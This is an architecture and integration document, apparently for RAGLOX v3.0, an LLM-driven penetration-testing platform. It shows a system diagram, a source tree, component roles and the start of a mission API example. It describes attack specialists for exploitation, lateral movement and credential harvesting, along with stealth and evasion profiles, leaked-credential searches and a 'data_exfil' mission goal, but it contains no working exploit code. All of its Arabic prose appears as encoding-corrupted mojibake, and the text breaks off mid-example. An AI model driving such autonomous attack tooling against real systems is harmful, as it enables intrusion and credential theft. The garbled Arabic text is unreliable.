# Ø®Ø±ÙŠØ·Ø© Ø§Ù„ØªÙƒØ§Ù…Ù„ Ø§Ù„ÙƒØ§Ù…Ù„Ø© Ø¨ÙŠÙ† Ø§Ù„Ø¨Ø§Ùƒ Ø§ÙŠÙ†Ø¯ ÙˆØ§Ù„ÙØ±ÙˆÙ†Øª Ø§ÙŠÙ†Ø¯ - RAGLOX v3.0

**Ø§Ù„ØªØ§Ø±ÙŠØ®**: 2026-01-03  
**Ø§Ù„Ø­Ø§Ù„Ø©**: ØªØ­Ù„ÙŠÙ„ Ø´Ø§Ù…Ù„ ÙˆÙ…Ù†Ù‡Ø¬ÙŠ Ù„Ù„ØªÙƒØ§Ù…Ù„  
**Ø§Ù„Ù‡Ø¯Ù**: ØªÙˆØ«ÙŠÙ‚ ÙƒØ§Ù…Ù„ ÙˆÙˆØ§Ø¶Ø­ Ù„Ø¬Ù…ÙŠØ¹ Ù†Ù‚Ø§Ø· Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨ÙŠÙ† Ø§Ù„Ø¨Ø§Ùƒ Ø§ÙŠÙ†Ø¯ ÙˆØ§Ù„ÙØ±ÙˆÙ†Øª Ø§ÙŠÙ†Ø¯ Ù„Ù„ØªØ­Ø¶ÙŠØ± Ù„Ù„Ø¥Ù†ØªØ§Ø¬

---

## ðŸ“‹ Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ù…Ø­ØªÙˆÙŠØ§Øª

1. [Ù†Ø¸Ø±Ø© Ø¹Ø§Ù…Ø© Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø¹Ù…Ø§Ø±ÙŠØ©](#1-Ù†Ø¸Ø±Ø©-Ø¹Ø§Ù…Ø©-Ø¹Ù„Ù‰-Ø§Ù„Ù…Ø¹Ù…Ø§Ø±ÙŠØ©)
2. [ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨Ø§Ùƒ Ø§ÙŠÙ†Ø¯ Ø§Ù„ØªÙØµÙŠÙ„ÙŠ](#2-ØªØ­Ù„ÙŠÙ„-Ø§Ù„Ø¨Ø§Ùƒ-Ø§ÙŠÙ†Ø¯-Ø§Ù„ØªÙØµÙŠÙ„ÙŠ)
3. [ÙˆØ§Ø¬Ù‡Ø§Øª Ø¨Ø±Ù…Ø¬Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª REST API](#3-ÙˆØ§Ø¬Ù‡Ø§Øª-Ø¨Ø±Ù…Ø¬Ø©-Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª-rest-api)
4. [Ø§ØªØµØ§Ù„Ø§Øª WebSocket](#4-Ø§ØªØµØ§Ù„Ø§Øª-websocket)
5. [Ù†Ù…Ø§Ø°Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ§Ù„Ù‡ÙŠØ§ÙƒÙ„](#5-Ù†Ù…Ø§Ø°Ø¬-Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª-ÙˆØ§Ù„Ù‡ÙŠØ§ÙƒÙ„)
6. [ØªØ¯ÙÙ‚ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙˆØ¢Ù„ÙŠØ§Øª Ø§Ù„ØªÙƒØ§Ù…Ù„](#6-ØªØ¯ÙÙ‚-Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª-ÙˆØ¢Ù„ÙŠØ§Øª-Ø§Ù„ØªÙƒØ§Ù…Ù„)
7. [ØªØ­Ù„ÙŠÙ„ Ø§Ù„ÙØ±ÙˆÙ†Øª Ø§ÙŠÙ†Ø¯ Ø§Ù„Ø­Ø§Ù„ÙŠ](#7-ØªØ­Ù„ÙŠÙ„-Ø§Ù„ÙØ±ÙˆÙ†Øª-Ø§ÙŠÙ†Ø¯-Ø§Ù„Ø­Ø§Ù„ÙŠ)
8. [Ø§Ù„ÙØ¬ÙˆØ§Øª ÙˆØ§Ù„Ù…ØªØ·Ù„Ø¨Ø§Øª Ø§Ù„Ù…ÙÙ‚ÙˆØ¯Ø©](#8-Ø§Ù„ÙØ¬ÙˆØ§Øª-ÙˆØ§Ù„Ù…ØªØ·Ù„Ø¨Ø§Øª-Ø§Ù„Ù…ÙÙ‚ÙˆØ¯Ø©)
9. [Ø®Ø·Ø© Ø§Ù„ØªÙƒØ§Ù…Ù„ Ø§Ù„ÙƒØ§Ù…Ù„Ø©](#9-Ø®Ø·Ø©-Ø§Ù„ØªÙƒØ§Ù…Ù„-Ø§Ù„ÙƒØ§Ù…Ù„Ø©)
10. [Ù…ØªØ·Ù„Ø¨Ø§Øª Ø§Ù„Ø¥Ù†ØªØ§Ø¬](#10-Ù…ØªØ·Ù„Ø¨Ø§Øª-Ø§Ù„Ø¥Ù†ØªØ§Ø¬)

---

## 1. Ù†Ø¸Ø±Ø© Ø¹Ø§Ù…Ø© Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø¹Ù…Ø§Ø±ÙŠØ©

### 1.1 Ø§Ù„Ù…Ø¹Ù…Ø§Ø±ÙŠØ© Ø§Ù„Ø¹Ø§Ù…Ø© Ù„Ù„Ù†Ø¸Ø§Ù…

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                       RAGLOX v3.0 ARCHITECTURE                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚               FRONTEND (React + TypeScript + Vite)              â”‚  â”‚
â”‚  â”‚  - UI Components (Manus Design System)                         â”‚  â”‚
â”‚  â”‚  - State Management (Zustand)                                  â”‚  â”‚
â”‚  â”‚  - API Client (Fetch/Axios)                                    â”‚  â”‚
â”‚  â”‚  - WebSocket Client                                            â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                â†•                                       â”‚
â”‚                    HTTP REST / WebSocket / Server-Sent Events         â”‚
â”‚                                â†•                                       â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚                BACKEND API (FastAPI + Python 3.11+)            â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚  â”‚  â”‚  REST API Layer (routes.py, knowledge_routes.py)         â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Mission Management Endpoints                          â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Target/Vuln/Cred/Session Endpoints                    â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - HITL Approval Endpoints                               â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Knowledge Base Query Endpoints                        â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Chat Endpoints                                        â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚  â”‚                                                                 â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚  â”‚  â”‚  WebSocket Layer (websocket.py)                          â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Mission Events Broadcasting                           â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Real-time Updates (targets, vulns, creds, sessions)  â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - HITL Approval Requests                                â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Chat Messages                                         â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚  â”‚                                                                 â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚  â”‚  â”‚  Controller Layer (mission.py)                           â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Mission Lifecycle Management                          â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Specialist Coordination                               â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Task Scheduling & Watchdog                            â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - HITL Approval Management                              â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Chat Message Handling                                 â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚  â”‚                                â†•                                â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚  â”‚  â”‚         BLACKBOARD (Redis) - Shared State                â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Mission Data                                          â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Targets, Vulnerabilities, Credentials, Sessions      â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Task Queues & Status                                 â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Approval Actions                                     â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Event Streams & Pub/Sub                              â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚  â”‚                    â†•          â†•          â†•          â†•          â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚  â”‚  â”‚  Recon    â”‚  â”‚  Attack   â”‚  â”‚ Intel     â”‚  â”‚ Analysis  â”‚  â”‚  â”‚
â”‚  â”‚  â”‚Specialist â”‚  â”‚Specialist â”‚  â”‚Specialist â”‚  â”‚Specialist â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚  â”‚                                                                 â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚  â”‚  â”‚  Knowledge Base (In-Memory + Embedded Data)              â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - 1,761 RX Modules (MITRE ATT&CK Tests)                â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - 201 Techniques                                        â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - 14 Tactics                                            â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - 7,000+ Nuclei Templates                              â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚  â”‚                                                                 â”‚  â”‚
â”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚  â”‚
â”‚  â”‚  â”‚  LLM Service (OpenAI/BlackBox/Mock)                      â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Task Planning                                         â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Command Generation                                    â”‚  â”‚  â”‚
â”‚  â”‚  â”‚  - Analysis & Reasoning                                  â”‚  â”‚  â”‚
â”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                                                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### 1.2 Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©

| Ø§Ù„Ù…ÙƒÙˆÙ† | Ø§Ù„Ø¹Ø¯Ø¯ / Ø§Ù„Ø­Ø¬Ù… | Ø§Ù„ÙˆØµÙ |
|--------|--------------|-------|
| **Backend Python Files** | 51 Ù…Ù„Ù | Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ù…Ù„ÙØ§Øª Python ÙÙŠ src/ |
| **Backend Code Lines** | ~30,646 Ø³Ø·Ø± | Ø¥Ø¬Ù…Ø§Ù„ÙŠ Ø£Ø³Ø·Ø± Ø§Ù„ÙƒÙˆØ¯ ÙÙŠ Ø§Ù„Ø¨Ø§Ùƒ Ø§ÙŠÙ†Ø¯ |
| **Frontend TypeScript Files** | 82 Ù…Ù„Ù | Ù…Ù„ÙØ§Øª TypeScript/TSX ÙÙŠ Ø§Ù„ÙØ±ÙˆÙ†Øª Ø§ÙŠÙ†Ø¯ |
| **REST API Endpoints** | 40+ Ù†Ù‚Ø·Ø© | Ù†Ù‚Ø§Ø· Ø§ØªØµØ§Ù„ REST API Ù…ÙˆØ«Ù‚Ø© |
| **WebSocket Events** | 15+ Ø­Ø¯Ø« | Ø£Ù†ÙˆØ§Ø¹ Ø§Ù„Ø£Ø­Ø¯Ø§Ø« Ø¹Ø¨Ø± WebSocket |
| **Data Models** | 25+ Ù†Ù…ÙˆØ°Ø¬ | Ù†Ù…Ø§Ø°Ø¬ Pydantic ÙÙŠ Ø§Ù„Ø¨Ø§Ùƒ Ø§ÙŠÙ†Ø¯ |
| **RX Modules** | 1,761 ÙˆØ­Ø¯Ø© | ÙˆØ­Ø¯Ø§Øª Ø§Ø®ØªØ¨Ø§Ø± MITRE ATT&CK |
| **Nuclei Templates** | 7,000+ Ù‚Ø§Ù„Ø¨ | Ù‚ÙˆØ§Ù„Ø¨ ÙØ­Øµ Ø§Ù„Ø«ØºØ±Ø§Øª |
| **MITRE Techniques** | 201 ØªÙ‚Ù†ÙŠØ© | ØªÙ‚Ù†ÙŠØ§Øª Ù…ØºØ·Ø§Ø© |
| **MITRE Tactics** | 14 ØªÙƒØªÙŠÙƒ | ØªÙƒØªÙŠÙƒØ§Øª Ù…Ø¯Ø¹ÙˆÙ…Ø© |

---

## 2. ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨Ø§Ùƒ Ø§ÙŠÙ†Ø¯ Ø§Ù„ØªÙØµÙŠÙ„ÙŠ

### 2.1 Ù‡ÙŠÙƒÙ„ Ø§Ù„Ù…Ø´Ø±ÙˆØ¹ Backend

```
src/
â”œâ”€â”€ api/                          # API Layer
â”‚   â”œâ”€â”€ main.py                   # FastAPI Application Entry Point
â”‚   â”œâ”€â”€ routes.py                 # Mission Management REST Endpoints
â”‚   â”œâ”€â”€ knowledge_routes.py       # Knowledge Base Query Endpoints
â”‚   â””â”€â”€ websocket.py              # WebSocket Event Broadcasting
â”‚
â”œâ”€â”€ controller/                   # Controller Layer
â”‚   â””â”€â”€ mission.py                # Mission Controller (Orchestration)
â”‚
â”œâ”€â”€ core/                         # Core Infrastructure
â”‚   â”œâ”€â”€ blackboard.py             # Redis-based Shared State
â”‚   â”œâ”€â”€ models.py                 # Pydantic Data Models
â”‚   â”œâ”€â”€ config.py                 # Configuration Management
â”‚   â”œâ”€â”€ knowledge.py              # Embedded Knowledge Base
â”‚   â”œâ”€â”€ exceptions.py             # Custom Exceptions
â”‚   â”œâ”€â”€ validators.py             # Data Validators
â”‚   â”œâ”€â”€ operational_memory.py     # Operational Context Memory
â”‚   â”œâ”€â”€ strategic_scorer.py       # Strategic Scoring Engine
â”‚   â”œâ”€â”€ stealth_profiles.py       # Stealth & Evasion Profiles
â”‚   â”‚
â”‚   â”œâ”€â”€ llm/                      # LLM Integration
â”‚   â”‚   â”œâ”€â”€ service.py            # LLM Service Manager
â”‚   â”‚   â”œâ”€â”€ base.py               # Base LLM Provider Interface
â”‚   â”‚   â”œâ”€â”€ openai_provider.py   # OpenAI Provider
â”‚   â”‚   â”œâ”€â”€ blackbox_provider.py # BlackBox AI Provider
â”‚   â”‚   â”œâ”€â”€ mock_provider.py     # Mock Provider (Testing)
â”‚   â”‚   â”œâ”€â”€ models.py             # LLM Request/Response Models
â”‚   â”‚   â””â”€â”€ prompts.py            # Prompt Templates
â”‚   â”‚
â”‚   â””â”€â”€ intel/                    # Intel Integration (OSINT/Leaks)
â”‚       â”œâ”€â”€ base.py               # Base Intel Provider
â”‚       â”œâ”€â”€ file_provider.py      # File-based Intel Provider
â”‚       â”œâ”€â”€ elasticsearch_provider.py  # Elasticsearch Provider
â”‚       â””â”€â”€ mock_provider.py      # Mock Provider
â”‚
â”œâ”€â”€ specialists/                  # Specialist Agents (Blackboard Pattern)
â”‚   â”œâ”€â”€ base.py                   # Base Specialist Class
â”‚   â”œâ”€â”€ recon.py                  # Reconnaissance Specialist
â”‚   â”œâ”€â”€ attack.py                 # Attack Specialist
â”‚   â”œâ”€â”€ analysis.py               # Analysis Specialist
â”‚   â””â”€â”€ intel.py                  # Intel/OSINT Specialist
â”‚
â”œâ”€â”€ executors/                    # Command Execution Layer
â”‚   â”œâ”€â”€ base.py                   # Base Executor Interface
â”‚   â”œâ”€â”€ factory.py                # Executor Factory
â”‚   â”œâ”€â”€ runner.py                 # Execution Runner
â”‚   â”œâ”€â”€ models.py                 # Executor Models
â”‚   â”œâ”€â”€ local.py                  # Local Executor
â”‚   â”œâ”€â”€ ssh.py                    # SSH Executor
â”‚   â”œâ”€â”€ winrm.py                  # WinRM Executor
â”‚   â””â”€â”€ ...
â”‚
â””â”€â”€ utils/                        # Utility Functions
    â””â”€â”€ ...
```

### 2.2 Ø§Ù„Ù…ÙƒÙˆÙ†Ø§Øª Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©

#### 2.2.1 FastAPI Application (main.py)

**Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠØ§Øª**:
- ØªÙ‡ÙŠØ¦Ø© ØªØ·Ø¨ÙŠÙ‚ FastAPI
- Ø¥Ø¹Ø¯Ø§Ø¯ CORS middleware
- ØªØ­Ù…ÙŠÙ„ Knowledge Base Ø¹Ù†Ø¯ Ø§Ù„Ø¨Ø¯Ø¡
- ØªÙ‡ÙŠØ¦Ø© LLM Service
- Ø¥Ù†Ø´Ø§Ø¡ Blackboard instance
- Ø¥Ù†Ø´Ø§Ø¡ Mission Controller
- Ø¥Ø¯Ø§Ø±Ø© Ø¯ÙˆØ±Ø© Ø­ÙŠØ§Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ (lifespan)

**Global Instances**:
```python
blackboard: Blackboard = None       # Ø§Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø´ØªØ±ÙƒØ© (Redis)
controller: MissionController = None # Ø§Ù„Ù…Ù†Ø³Ù‚ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
knowledge: EmbeddedKnowledge = None  # Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ù…Ø¹Ø±ÙØ©
```

**Routers Included**:
- `/api/v1/*` â†’ Mission Management & HITL (routes.py)
- `/api/v1/knowledge/*` â†’ Knowledge Base Queries (knowledge_routes.py)  
- `/ws/*` â†’ WebSocket Events (websocket.py)

#### 2.2.2 Mission Controller (controller/mission.py)

**Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠØ§Øª**:
- Ø¥Ø¯Ø§Ø±Ø© Ø¯ÙˆØ±Ø© Ø­ÙŠØ§Ø© Ø§Ù„Ù…Ù‡Ù…Ø© (create, start, pause, resume, stop)
- ØªÙ†Ø³ÙŠÙ‚ Specialists
- ØªØªØ¨Ø¹ Ø§Ù„Ø£Ù‡Ø¯Ø§Ù (Goals)
- Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
- Ø¥Ø¯Ø§Ø±Ø© Task Queues
- Task Watchdog (Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ù…Ù‡Ø§Ù… Ø§Ù„Ø¹Ø§Ù„Ù‚Ø©)
- Ø¥Ø¯Ø§Ø±Ø© HITL Approvals
- Ù…Ø¹Ø§Ù„Ø¬Ø© Chat Messages

**State**:
```python
_active_missions: Dict[str, Dict[str, Any]]  # Ø§Ù„Ù…Ù‡Ø§Ù… Ø§Ù„Ù†Ø´Ø·Ø©
_specialists: Dict[str, List[Any]]            # Specialist instances
_pending_approvals: Dict[str, ApprovalAction] # Ø·Ù„Ø¨Ø§Øª Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø§Ù„Ù…Ø¹Ù„Ù‚Ø©
_chat_history: Dict[str, List[ChatMessage]]  # Ø³Ø¬Ù„ Ø§Ù„Ù…Ø­Ø§Ø¯Ø«Ø§Øª
```

#### 2.2.3 Blackboard (core/blackboard.py)

**Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠØ§Øª**:
- Ø§Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…Ø´ØªØ±Ùƒ Ù„Ù„Ø­Ø§Ù„Ø© (Redis)
- CRUD operations Ù„Ø¬Ù…ÙŠØ¹ Ø§Ù„ÙƒÙŠØ§Ù†Ø§Øª
- Pub/Sub Ù„Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø§Ù„ÙÙˆØ±ÙŠØ©
- Task Queues (Sorted Sets)
- Event Streams

**Entities Stored**:
- Missions
- Targets
- Vulnerabilities
- Credentials
- Sessions
- Tasks
- Attack Paths
- Goals
- Statistics

#### 2.2.4 Knowledge Base (core/knowledge.py)

**Ø§Ù„Ù…Ø­ØªÙˆÙ‰**:
- **RX Modules**: 1,761 ÙˆØ­Ø¯Ø© Ø§Ø®ØªØ¨Ø§Ø± Ù…Ù† Atomic Red Team
- **MITRE ATT&CK**: 201 ØªÙ‚Ù†ÙŠØ©ØŒ 14 ØªÙƒØªÙŠÙƒ
- **Nuclei Templates**: 7,000+ Ù‚Ø§Ù„Ø¨ ÙØ­Øµ Ø«ØºØ±Ø§Øª
- **Platform Support**: Windows, Linux, macOS, Cloud
- **Executor Types**: PowerShell, Bash, CMD, Python, etc.

**Query Capabilities**:
- Ø§Ù„Ø¨Ø­Ø« Ø­Ø³Ø¨ Technique/Tactic/Platform
- Ø§Ù„ÙÙ„ØªØ±Ø© Ø­Ø³Ø¨ Executor Type
- Ø§Ù„Ø¨Ø­Ø« Ø§Ù„Ù†ØµÙŠ
- Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø£ÙØ¶Ù„ Module Ù„Ù…Ù‡Ù…Ø© Ù…Ø¹ÙŠÙ†Ø©
- Ø§Ù„Ø§Ø³ØªØ¹Ù„Ø§Ù… Ø¹Ù† Exploit/Recon/Cred/Privesc modules

#### 2.2.5 Specialists

**Recon Specialist** (specialists/recon.py):
- Network scanning
- Port discovery
- Service enumeration
- OS detection

**Attack Specialist** (specialists/attack.py):
- Vulnerability exploitation
- Privilege escalation
- Lateral movement
- Credential harvesting

**Intel Specialist** (specialists/intel.py):
- OSINT lookups
- Leaked credential searches
- Threat intelligence queries

**Analysis Specialist** (specialists/analysis.py):
- Attack path analysis
- Risk scoring
- Goal progress tracking

---

## 3. ÙˆØ§Ø¬Ù‡Ø§Øª Ø¨Ø±Ù…Ø¬Ø© Ø§Ù„ØªØ·Ø¨ÙŠÙ‚Ø§Øª REST API

### 3.1 Mission Management API

**Base Path**: `/api/v1/missions`

#### 3.1.1 Create Mission
```http
POST /api/v1/missions
Content-Type: application/json

Request Body:
{
  "name": "Mission Alpha",
  "description": "Test penetration of target network",
  "scope": ["192.168.1.0/24", "example.com"],
  "goals": ["domain_admin", "data_exfil"],
  "constraints": {
    "stealth": true,
    "max_sessions": 5
  }
}

Response (201):
{
